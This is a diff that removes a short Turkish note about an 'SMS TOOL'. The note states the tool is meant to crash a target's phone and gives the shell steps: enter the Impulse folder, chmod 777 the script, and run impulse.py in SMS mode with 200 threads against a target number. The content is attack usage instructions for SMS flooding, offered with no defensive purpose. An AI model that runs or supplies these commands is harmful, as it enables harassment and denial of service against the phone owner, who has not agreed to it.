@@ -1,9 +1,0 @@
-	SMS TOOL
- Bu tool'u hedef telefonu çökertmek için kullanabiliriz.
-
-cd ..
-cd opt
-cd Impulse
-chmod 777 impulse.py	- Herhangi bir hata alırsan çalıştır.
-pyhon3 impulse.py
-python3 impulse.py --method sms --time 10 --threads 200 --target <hedef no>
